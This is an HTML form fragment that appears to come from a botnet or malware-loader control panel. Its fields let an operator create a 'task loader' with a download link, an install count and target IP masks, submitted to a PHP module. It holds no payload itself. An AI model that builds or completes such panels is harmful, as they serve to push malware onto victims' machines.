<form id='frm_createTaskLoader' onsubmit='var pdata = ajax_getInputs("frm_createTaskLoader"); ajax_pload("mod_gtaskloader.php", pdata, "div_ajax"); return false;'>

<table>
<tr align='left'>
	<td><label>LOAD LINK:</label></td>
	<td><input size='80' name='loadlink' value='' maxlenght=1000></td>
</tr>
<tr align='left'>
	<td><label>LOADS COUNT:</label></td>
	<td><input size='4' name='loadscnt' value='' maxlenght=6></td>
</tr>
<tr align='left'>
	<td><label>IP MASKS:</label></td>
	<td><textarea id='ipmasks' name='ipmasks' style='width: 200px; height: 100px;'></textarea></td>
</tr>

<tr align='left'>
	<td colspan='2'><label>NOTE:</label><br><textarea name='note' cols='100' rows='3' wrap='off'></textarea></td>
</tr>
</table>

<br><br><input type='submit' value='SAVE'>

</form>